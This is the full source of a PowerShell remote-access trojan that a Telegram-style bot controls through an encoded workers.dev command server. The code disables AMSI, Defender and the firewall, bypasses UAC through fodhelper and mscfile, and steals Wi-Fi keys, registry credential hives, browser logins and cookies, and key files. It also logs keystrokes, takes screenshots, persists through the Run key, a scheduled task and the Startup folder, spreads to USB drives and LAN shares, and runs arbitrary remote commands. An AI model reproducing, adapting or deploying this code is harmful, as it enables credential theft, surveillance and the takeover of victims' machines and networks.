$b='__aHR0cHM6Ly9kZGxscy5oaWRlNHlvdS1pbi53b3JrZXJzLmRldnwzOTExYWM4Y2RlMDQ1ZmE5NDFkZGQyYWQ1NzJmOWE5ODE5ODBlZWVlZDgxZDFiNThlYjFhMDExNDNmYTk2ODgzfDg4MjA3NjA1NjJ8YVFCbEFIZ0FLQUJwQUhJQWJRQWdBQ2NBYUFCMEFIUUFjQUJ6QURvQUx3QXZBSElBWVFCM0FDNEFad0JwQUhRQWFBQjFBR0lBZFFCekFHVUFjZ0JqQUc4QWJnQjBBR1VBYmdCMEFDNEFZd0J2QUcwQUx3QnFBRzhBYUFCdUFIWUFhUUIyQUdVQWF3QnpBR2dBWVFCeUFHMEFZUUEzQURnQVl3QnZBR1FBWlFCeUFDOEFkZ0JwQUdRQVpRQnZBR2NBWVFCdEFHVUFjd0F2QUhJQVpRQm1BSE1BTHdCb0FHVUFZUUJrQUhNQUx3QnRBR0VBYVFCdUFDOEFZUUF1QUhBQWN3QXhBQ2NBS1FBPXxNaWNyb3NvZnRcfHxNaWNyb3NvZnRcV2luZG93c1x8c3ZjLmV4ZQ==__'
$c=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)).Split('|')
$W=$c[0];$K=$c[1];$C=[long]$c[2];$L=$c[3];$DIR=$c[4];$RUN=$c[5];$TASK=$c[6];$EXE=$c[7];$H=@{'x-k'=$K}
$ErrorActionPreference='SilentlyContinue'
try{$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)}catch{}
try{$x=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($x,[IntPtr]([int64]$x+0x1c),0x800)}catch{}
if($PSCommandPath){Remove-Item $PSCommandPath -Force}
$G=(Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography').MachineGuid
$I=('{0:X4}' -f [int](([char[]]$G|%{[int]$_}|Measure -Sum).Sum % 65536))
$D="$env:LOCALAPPDATA\$DIR";$X="$D\$EXE";$ST="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$EXE";$o=0
function Adm{([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators')}
function S($t){if(!$t){$t='-'};for($i=0;$i -lt $t.Length;$i+=3800){$q=$t.Substring($i,[Math]::Min(3800,$t.Length-$i));try{Invoke-RestMethod "$W/sendMessage" -Method Post -Headers $H -Body @{chat_id=$C;text=$q} -TimeoutSec 20|Out-Null}catch{Start-Sleep 1}}}
function U($f){if(Test-Path $f -and (Get-Item $f).Length -lt 45MB){try{$s=[IO.File]::OpenRead((Resolve-Path $f));Invoke-RestMethod "$W/sendDocument" -Method Post -Headers $H -Form @{chat_id=$C;document=$s} -TimeoutSec 300|Out-Null;$s.Dispose()}catch{S 'up fail'}}}
function G2($fid){try{$r=Invoke-RestMethod "$W/getFile?file_id=$fid" -Headers $H;$p="$env:TEMP\$($r.result.file_path.Split('/')[-1])";Invoke-WebRequest "$W/file/$($r.result.file_path)" -Headers $H -OutFile $p -TimeoutSec 300;S "saved $p"}catch{S 'dl fail'}}
function P{$I+'|'+$env:COMPUTERNAME+'|'+$env:USERDOMAIN+'\'+$env:USERNAME+'|'+$env:PROCESSOR_ARCHITECTURE+'|adm:'+(Adm)+'|'+[Environment]::OSVersion.VersionString}

function DefOff{
  if(!(Adm)){S 'needs admin';return}
  Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -MAPSReporting 0 -SubmitSamplesConsistency $false
  (Get-MpPreference).AttackSurfaceReductionRules_Ids|%{Set-MpPreference -AttackSurfaceReductionRules_Ids $_ -AttackSurfaceReductionRules_Actions Disabled}
  Add-MpPreference -ExclusionPath $D;Add-MpPreference -ExclusionPath $ST
  S 'defender down'
}
function FwOff{if(Adm){netsh advfirewall set allprofiles state off;Set-NetFirewallProfile -All -Enabled False;S 'firewall down'}else{S 'needs admin'}}

function AutoEsc{
  if(Adm){S 'already admin';return}
  $k='HKCU:\Software\Classes\ms-settings\Shell\Open\command'
  $cmd="powershell -NoP -WindowStyle Hidden -Exec Bypass -enc $L"
  New-Item $k -Force|Out-Null;Set-ItemProperty $k -Name DelegateExecute -Value '' -Force;Set-ItemProperty $k -Name '(default)' -Value $cmd -Force
  Start-Process fodhelper.exe;Start-Sleep 4
  Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
  $k2='HKCU:\Software\Classes\mscfile\shell\open\command'
  if(!(Adm)){New-Item $k2 -Force|Out-Null;Set-ItemProperty $k2 -Name '(default)' -Value $cmd -Force;Start-Process compmgmt.msc;Start-Sleep 4;Remove-Item 'HKCU:\Software\Classes\mscfile' -Recurse -Force}
  if(Adm){S 'elevated'}else{S 'no elevation (standard user)'}
}
function Recon{
  $r=@()
  $r+='== privs ==';$r+=(whoami /priv 2>$null|Out-String)
  $r+='== admins ==';$r+=(net localgroup administrators 2>$null|Out-String)
  $r+='== saved creds ==';$r+=(cmdkey /list 2>$null|Out-String)
  $r+='== winlogon ==';$r+=((Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon').DefaultPassword)
  $r+='== AIE ==';$r+=((Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer').AlwaysInstallElevated)
  $r+='== unattend =='
  'C:\Windows\Panther\unattend.xml','C:\Windows\System32\Sysprep\unattend.xml'|%{if(Test-Path $_){$r+=; $r+=(Select-String -Path $_ -Pattern 'Password|Username'|%{$_.Line})}}
  $r+='== unquoted svc ==';$r+=((Get-CimInstance Win32_Service|?{$_.PathName -notmatch '^"' -and $_.PathName -match ' '}|Select Name,PathName,StartMode|Out-String))
  $r+='== writable svc dirs =='
  Get-CimInstance Win32_Service|%{$p=($_.PathName -replace '"','').Split(' ')[0];if($p -and (Test-Path $p)){$d=Split-Path $p;if((icacls $d 2>$null)-match 'Everyone|Users'){$r+="$($_.Name) $d"}}}
  S ($r -join "`n")
}
function Loot{
  $z="$env:TEMP\$(R 6).zip";$t="$env:TEMP\lt";New-Item $t -ItemType Directory -Force|Out-Null
  (netsh wlan show profiles) -match 'All User Profile'|%{($_ -split ':')[1].Trim()}|%{netsh wlan show profile name="$_" key=clear}|Out-File "$t\wifi.txt"
  cmdkey /list|Out-File "$t\cmdkey.txt"
  if(Adm){reg save HKLM\SAM "$t\SAM" /y;reg save HKLM\SYSTEM "$t\SYSTEM" /y;reg save HKLM\SECURITY "$t\SECURITY" /y}
  'Chrome','Edge','Brave'|%{$n=$_;$p="$env:LOCALAPPDATA\$n\User Data\Default";if(Test-Path $p){Copy-Item "$p\Login Data" "$t\$n.db" -Force;Copy-Item "$p\Cookies" "$t\$n.cookies" -Force}}
  Get-ChildItem "$env:USERPROFILE" -Include *.kdbx,*.ovpn,*.rdp,*.ppk,*.pem -Recurse -Depth 3|%{Copy-Item $_.FullName "$t\" -Force}
  Compress-Archive "$t\*" $z -Force;U $z;Remove-Item $t,$z -Recurse -Force
}
function Shot{
  Add-Type -AssemblyName System.Windows.Forms,System.Drawing
  $b2=[Windows.Forms.SystemInformation]::VirtualScreen
  $bmp=New-Object Drawing.Bitmap $b2.Width,$b2.Height
  [Drawing.Graphics]::FromImage($bmp).CopyFromScreen($b2.X,$b2.Y,0,0,$bmp.Size)
  $f="$env:TEMP\$(R 6).png";$bmp.Save($f);U $f;Remove-Item $f -Force
}
function Keylog{
  $p="$env:TEMP\kk.txt";$q="$env:TEMP\kl.ps1"
  @'
Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);}'
$m=@{8='[BK]';9='[TAB]';13="`n";32=' ';16='';17='';18='';20='';160='';161='';162='';163='';46='[DEL]'}
while(1){for($i=8;$i -lt 190;$i++){if([K]::GetAsyncKeyState($i) -band 0x8000){$c=if($m.ContainsKey($i)){$m[$i]}elseif($i -ge 65 -and $i -le 90){[char]$i}else{''};if($c){Add-Content '__F__' $c -NoNewline}};Start-Sleep -Milliseconds 40}
'@.Replace('__F__',$p)|Set-Content $q
  Start-Process powershell -ArgumentList "-NoP -WindowStyle Hidden -Exec Bypass -File `"$q`"" -WindowStyle Hidden
  S "keylog -> $p"
}
function Persist{
  New-Item $D -ItemType Directory -Force|Out-Null
  if(!(Test-Path $X)){Copy-Item "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" $X -Force}
  reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $RUN /t REG_SZ /d "`"$X`" -NoP -WindowStyle Hidden -Exec Bypass -enc $L" /f|Out-Null
  schtasks /create /tn $TASK /tr "`"$X`" -NoP -WindowStyle Hidden -Exec Bypass -enc $L" /sc onlogon /f 2>$null|Out-Null
  Copy-Item $X $ST -Force
  if(Adm){Add-MpPreference -ExclusionPath $D;Add-MpPreference -ExclusionPath (Split-Path $ST)}
  S "persisted: $RUN | $TASK"
}
function Hide{if(!(Test-Path $X)){New-Item $D -ItemType Directory -Force|Out-Null;Copy-Item "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" $X -Force};Start-Process $X -ArgumentList "-NoP -WindowStyle Hidden -Exec Bypass -enc $L" -WindowStyle Hidden;S "hidden as $EXE"}
function Kit($r){
  $s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut("$r\Documents.lnk")
  $l.TargetPath="$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
  $l.Arguments="-NoP -WindowStyle Hidden -Exec Bypass -enc $L";$l.IconLocation="$env:SystemRoot\System32\shell32.dll,70";$l.WindowStyle=7;$l.Save()
  Set-Content "$r\autorun.inf" "[AutoRun]`nopen=Documents.lnk" -Encoding ASCII
  New-Item "$r\_" -ItemType Directory -Force|Out-Null;Copy-Item $PSCommandPath "$r\_\a.ps1" -Force -EA 0
}
function Spread{
  Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2'|%{try{Kit $_.DeviceID}catch{}}
  (net view 2>$null)|Select-String '\\\\'|%{$n=($_.ToString() -split '\s+')[1];if($n){try{Copy-Item $X "$n\C$\Users\Public\$EXE" -Force;schtasks /create /s $n /tn $TASK /tr "C:\Users\Public\$EXE -NoP -WindowStyle Hidden -Exec Bypass -enc $L" /sc onlogon /f 2>$null|Out-Null;S "lan $n"}catch{}}}
  S 'spread done'
}
function Burn{
  reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $RUN /f 2>$null|Out-Null
  schtasks /delete /tn $TASK /f 2>$null|Out-Null
  Remove-Item $ST -Force -EA 0;Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\*" -Force -EA 0
  Remove-Item "$env:TEMP\kk.txt","$env:TEMP\kl.ps1" -Force -EA 0
  if(Adm){Remove-MpPreference -ExclusionPath $D -EA 0}
  Remove-Item $D -Recurse -Force -EA 0;S 'burned';exit
}

S "REG $I`n$(P)"
if(!(Adm)){AutoEsc}
while(1){
  try{$r=Invoke-RestMethod "$W/getUpdates?offset=$o&timeout=50" -Headers $H -TimeoutSec 70}
  catch{if($_.Exception.Response.StatusCode.value__ -eq 401){Burn};Start-Sleep 2;continue}
  foreach($u in $r.result){$o=$u.update_id+1;$m=$u.message;if(!$m){continue}
    if($m.document){G2 $m.document.file_id;continue}
    $t=$m.text;if(!$t){continue}
    $g=$null;if($t -match '^/([0-9A-F]{4})\s+([\s\S]+)'){$g=$Matches[1];$t=$Matches[2]}
    if($g -and $g -ne $I){continue}
    if($t -match '^/all\s+([\s\S]+)'){$t=$Matches[1];S "[$I] $t"}
    switch -Regex($t){
      '^/list'{S "ALIVE $I`n$(P)";break}
      '^/sys'{S (P+"`n"+(Get-ChildItem Env:|Out-String));break}
      '^/recon'{Recon;break}
      '^/autoesc'{AutoEsc;break}
      '^/defoff'{DefOff;break}
      '^/fwoff'{FwOff;break}
      '^/persist'{Persist;break}
      '^/hide'{Hide;break}
      '^/spread'{Spread;break}
      '^/burn'{Burn}
      '^/kill'{S bye;exit}
      '^/loot'{Loot;break}
      '^/shot'{Shot;break}
      '^/keylog'{Keylog;break}
      '^/keydump'{if(Test-Path "$env:TEMP\kk.txt"){U "$env:TEMP\kk.txt"}else{S 'no log'};break}
      '^/clip'{S (Get-Clipboard|Out-String);break}
      '^/av'{(Get-CimInstance -Namespace root/SecurityCenter2 -Class AntiVirusProduct|Select displayName,productState|Out-String)|%{S $_};break}
      '^/svc'{(Get-CimInstance Win32_Service|Select Name,State,StartMode,PathName|Out-String)|%{S $_};break}
      '^/task'{(schtasks /query /fo LIST 2>$null|Select-String 'TaskName|Status|Run As'|Out-String)|%{S $_};break}
      '^/users'{(quser 2>$null;net user 2>$null)|Out-String|%{S $_};break}
      '^/port'{(netstat -ano|Select-String LISTEN|Out-String)|%{S $_};break}
      '^/who'{(Get-CimInstance Win32_LoggedOnUser|Out-String)|%{S $_};break}
      '^/ls (.*)'{$p=$Matches[1];(Get-ChildItem $p -Force -EA 0|Select Mode,LastWriteTime,Length,Name|Out-String)|%{S $_};break}
      '^/cat (.*)'{S (Get-Content $Matches[1] -Raw -EA 0);break}
      '^/put (.*)'{$q=$Matches[1].Split('|',2);Set-Content $q[0] $q[1] -EA 0;S "wrote $($q[0])";break}
      '^/del (.*)'{Remove-Item $Matches[1] -Recurse -Force -EA 0;S 'deleted';break}
      '^/find (.*)'{(Get-ChildItem C:\Users,$env:ProgramData -Recurse -Include "*$($Matches[1])*" -Depth 4 -EA 0|Select -First 40 FullName|Out-String)|%{S $_};break}
      '^/zip (.*)'{$z="$env:TEMP\$(R 5).zip";Compress-Archive $Matches[1] $z -Force -EA 0;U $z;Remove-Item $z -Force;break}
      '^/dl (.*)'{U $Matches[1].Trim();break}
      '^/get (\S+) (\S+)'{Invoke-WebRequest $Matches[1] -OutFile $Matches[2] -TimeoutSec 300;S 'ok';break}
      '^/ex (.*)'{Start-Process $Matches[1].Trim() -WindowStyle Hidden;S 'started';break}
      '^/ps'{(Get-Process|Sort WS -Desc|Select -First 30 Name,Id|Out-String)|%{S $_};break}
      default{S ((& cmd.exe /c "$t 2>&1"|Out-String))}
    }
  }
}
